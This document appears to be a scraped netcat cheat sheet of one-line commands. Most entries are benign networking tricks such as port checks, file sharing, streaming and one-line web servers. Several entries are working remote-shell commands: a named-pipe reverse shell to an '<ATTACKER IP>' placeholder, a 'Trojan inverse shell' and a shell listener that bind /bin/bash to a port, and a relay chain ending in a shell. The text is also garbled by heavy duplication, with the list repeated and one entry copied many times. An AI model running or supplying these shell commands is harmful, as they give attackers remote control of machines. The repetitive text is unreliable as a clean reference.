# netcat

### Netcat without -e

A lot of machines have netcat installed (example macosx) but it's not usable for reverse shells. However, with this it becomes useable.

```sh
mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc <ATTACKER IP> <PORT> 1>/tmp/backpipe
```

### mp3 streaming
```sh
nc -l -p 2000 < song.mp3
```

### netcat - receive tar archive remotely
```sh
nc -l $PORT | pv -b > archive.tar.bz2
```

### One command line web server on port 80 using nc (netcat)
```sh
nc -kl 5432 -c 'echo -e "HTTP/1.1 200 OK\r\n$(date)\r\n\r\n";echo "<p>How are you today?</p>"'
```

### determine if tcp port is open
```sh
nc <ip> <port> -v
```

### Sharing a file through http 80 port:
```sh
nc -w 5 -v -l -p 80 < file.ext
```

### Stream and copy a video from lan
```sh
nc HOST PORT | tee movie.mp4 | mplayer -
```

### Trojan inverse shell
```sh
nc -l -p 2000 -e /bin/bash
```

### determine if tcp port is open
```sh
nc -zw2 www.example.com 80 && echo open
```

### Complete TCP Handshake on a given host-port
```sh
nc -zvw 1 host port
```

### Sharing file through http 80 port
```sh
nc -v -l 80 < file.ext
```

### Show the date of easter
```sh
ncal -e
```

### Create a single-use TCP (or UDP) proxy
```sh
nc -l -p 2000 -c "nc example.org 3000"
```

### ncdu - ncurses disk usage
```sh
ncdu directory_name
```

### Sharing file through http 80 port
```sh
nc -v -l 80 < file.ext
```


### netcat as a portscanner
```sh
nc -v -n -z -w 1 127.0.0.1 22-1000
```

### Sharing file through http 80 port
```sh
nc -v -l 80 < file.ext
```

### Sharing file through http 80 port
```sh
nc -v -l 80 < file.ext
```

### Sharing file through http 80 port
```sh
nc -v -l 80 < file.ext
```

### Simple server which listens on a port and prints out received data
```sh
ncat -l portnumber
```

### Ultimate current directory usage command
```sh
ncdu
```

### spawn shell listener service with nc
```sh
nc -l -p 3003 -e /bin/bash
```

### Simple multi-user encrypted chat server for 5 users
```sh
ncat -vlm 5 ssl chat 9876
```

### Netcat Relay
```sh
nc -vv $MIDDLEHOST 1234; ## nc -vv -l $IamMIDDLEHOST 1234 | nc $Targethost 1234;##  nc -l $IamTargetHost 1234 -e /bin/bash;
```

### Display information sent by browser
```sh
nc -l 8000
```

### live netcat network throughput test
```sh
nc -l -p 7777 > /dev/null
```

### Intercept, monitor and manipulate a TCP connection.
```sh
ncat -l -p 1234 sh-exec "tee -a to.log | nc machine port | tee -a from.log"
```

### send substituted text to a command without echo, pipe
```sh
nc localhost 10000 <<< "message"
```

### pipe commands from a textfile to a telnet-server with netcat
```sh
nc $telnetserver 23 < $commandfile
```

### Check a server is up. If it isn't mail me.
```sh
nc -zw2 www.example.com 80 || echo http service is down | mail -s 'http is down' admin@example.com
```

### test connection to a remote IP / port
```sh
nc -z <IP> <TCP port>  OR   nc -zu <IP> <UDP port>
```

### Listen on an arbitrary port
```sh
nc -l <port-number>
```

### Simple server which listens on a port and prints out received data
```sh
nc -l -p portnumber
```

### Internet file transfer program for scripts that can be easily used to get files from a ftp
```sh
ncftpget -u Us3r -p Passw0rd ftp.backups.com . 'site.com.tar.gz'
```

### One line web server (working with any web browser)
```sh
nc -kl 5432 -c 'echo -e "HTTP/1.1 200 OK\r\n$(date)\r\n\r\n";echo "<p>How are you today?</p>"'
```

### Simplest web server ever!
```sh
nc -k -l 5432 -c 'echo My Web Server is Alive'
```

### Check if TCP port 25 is open
```sh
nc -zv localhost 25
```

### nc check udp port
```sh
nc -vz -u 8.8.8.8 53
```

### mp3 streaming
```sh
nc -l -p 2000 < song.mp3
```

### Stream and copy a video from lan
```sh
nc HOST PORT | tee movie.mp4 | mplayer -
```

### Trojan inverse shell
```sh
nc -l -p 2000 -e /bin/bash
```

### determine if tcp port is open
```sh
nc -zw2 www.example.com 80 && echo open
```

### Complete TCP Handshake on a given host-port
```sh
nc -zvw 1 host port
```

### Sharing file through http 80 port
```sh
nc -v -l 80 < file.ext
```

### Sharing file through http 80 port
```sh
nc -v -l 80 < file.ext
```

### Sharing file through http 80 port
```sh
nc -v -l 80 < file.ext
```

### Sharing file through http 80 port
```sh
nc -v -l 80 < file.ext
```

### Sharing file through http 80 port
```sh
nc -v -l 80 < file.ext
```

### Sharing file through http 80 port
```sh
nc -v -l 80 < file.ext
```

### Show the date of easter
```sh
ncal -e
```

### Create a single-use TCP (or UDP) proxy
```sh
nc -l -p 2000 -c "nc example.org 3000"
```

### ncdu - ncurses disk usage
```sh
ncdu directory_name
```

### Sharing file through http 80 port
```sh
nc -v -l 80 < file.ext
```

### Sharing file through http 80 port
```sh
nc -v -l 80 < file.ext
```

### netcat as a portscanner
```sh
nc -v -n -z -w 1 127.0.0.1 22-1000
```

### Sharing file through http 80 port
```sh
nc -v -l 80 < file.ext
```

### Sharing file through http 80 port
```sh
nc -v -l 80 < file.ext
```

### Simple server which listens on a port and prints out received data
```sh
ncat -l portnumber
```

### Ultimate current directory usage command
```sh
ncdu
```

### spawn shell listener service with nc
```sh
nc -l -p 3003 -e /bin/bash
```

### Simple multi-user encrypted chat server for 5 users
```sh
ncat -vlm 5 ssl chat 9876
```

### Netcat Relay
```sh
nc -vv $MIDDLEHOST 1234; ## nc -vv -l $IamMIDDLEHOST 1234 | nc $Targethost 1234;##  nc -l $IamTargetHost 1234 -e /bin/bash;
```

### Display information sent by browser
```sh
nc -l 8000
```

### live netcat network throughput test
```sh
nc -l -p 7777 > /dev/null
```

### Intercept, monitor and manipulate a TCP connection.
```sh
ncat -l -p 1234 sh-exec "tee -a to.log | nc machine port | tee -a from.log"
```

### send substituted text to a command without echo, pipe
```sh
nc localhost 10000 <<< "message"
```

### pipe commands from a textfile to a telnet-server with netcat
```sh
nc $telnetserver 23 < $commandfile
```

### Check a server is up. If it isn't mail me.
```sh
nc -zw2 www.example.com 80 || echo http service is down | mail -s 'http is down' admin@example.com
```

### test connection to a remote IP / port
```sh
nc -z <IP> <TCP port>  OR   nc -zu <IP> <UDP port>
```

### Listen on an arbitrary port
```sh
nc -l <port-number>
```

### Simple server which listens on a port and prints out received data
```sh
nc -l -p portnumber
```

### Internet file transfer program for scripts that can be easily used to get files from a ftp
```sh
ncftpget -u Us3r -p Passw0rd ftp.backups.com . 'site.com.tar.gz'
```

### One line web server (working with any web browser)
```sh
nc -kl 5432 -c 'echo -e "HTTP/1.1 200 OK\r\n$(date)\r\n\r\n";echo "<p>How are you today?</p>"'
```

### Simplest web server ever!
```sh
nc -k -l 5432 -c 'echo My Web Server is Alive'
```

### Check if TCP port 25 is open
```sh
nc -zv localhost 25
```
